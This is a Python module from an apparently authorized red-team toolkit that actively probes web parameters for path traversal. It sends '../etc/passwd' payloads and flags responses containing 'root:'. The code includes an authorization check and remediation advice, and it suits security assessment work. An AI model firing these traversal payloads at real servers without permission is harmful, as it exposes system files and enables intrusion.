"""
Path/directory traversal detection — probes file-path-like parameters with
standard traversal sequences targeting a known, harmless confirmation
signature (the expected first line of /etc/passwd) rather than exfiltrating
arbitrary sensitive files. Confirmation is the stopping point.
"""

from __future__ import annotations

import urllib.parse
import urllib.request

from redteam_toolkit.core.models import Finding, FindingCategory, Severity
from redteam_toolkit.core.netutil import extract_host
from redteam_toolkit.recon.base import BaseReconModule

DEFAULT_PARAMS = ["file", "path", "page", "doc", "filename"]
_PAYLOADS = ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"]
MAX_PROBES_PER_PARAM = len(_PAYLOADS)

CONFIRMATION_SIGNATURE = "root:"


class PathTraversalModule(BaseReconModule):
    name = "path_traversal_detection"
    category = "active"

    def __init__(self, engagement, fetch_fn=None, timeout: float = 5.0):
        super().__init__(engagement)
        self.timeout = timeout
        self._fetch = fetch_fn or self._default_fetch
        self.probe_count = 0

    def scan(self, target: str, params: list[str] | None = None) -> list[Finding]:
        host = extract_host(target)
        self.engagement.authorize_action(self.name, host, "traversal_probe", category=self.category)

        params = params or DEFAULT_PARAMS
        findings = []

        for param in params:
            for payload in _PAYLOADS:
                self.probe_count += 1
                body = self._fetch(target, param, payload)
                if CONFIRMATION_SIGNATURE in body:
                    findings.append(Finding(
                        module=self.name,
                        title=f"Path traversal in parameter '{param}'",
                        severity=Severity.CRITICAL,
                        category=FindingCategory.ACTIVE,
                        target=target,
                        description=(
                            f"Supplying a traversal sequence in '{param}' returned file content "
                            f"outside the intended directory."
                        ),
                        evidence=body[:120],
                        remediation="Canonicalise and validate file paths against an allow-list; "
                                    "never concatenate user input directly into filesystem paths.",
                        cvss_score=9.1,
                        extra={"parameter": param, "payload": payload},
                    ))
                    break

        if not findings:
            findings.append(Finding(
                module=self.name,
                title="No path traversal detected",
                severity=Severity.INFO,
                category=FindingCategory.ACTIVE,
                target=target,
                description=f"Probed {len(params)} parameter(s) — no traversal confirmed.",
            ))

        return findings

    def _default_fetch(self, target: str, param: str, payload: str) -> str:
        url = target if target.startswith(("http://", "https://")) else f"https://{target}"
        sep = "&" if "?" in url else "?"
        full_url = f"{url}{sep}{param}={urllib.parse.quote(payload, safe='')}"
        req = urllib.request.Request(full_url, headers={"User-Agent": "redteam-toolkit/0.1"})
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return resp.read().decode("utf-8", errors="replace")
        except Exception:
            return ""
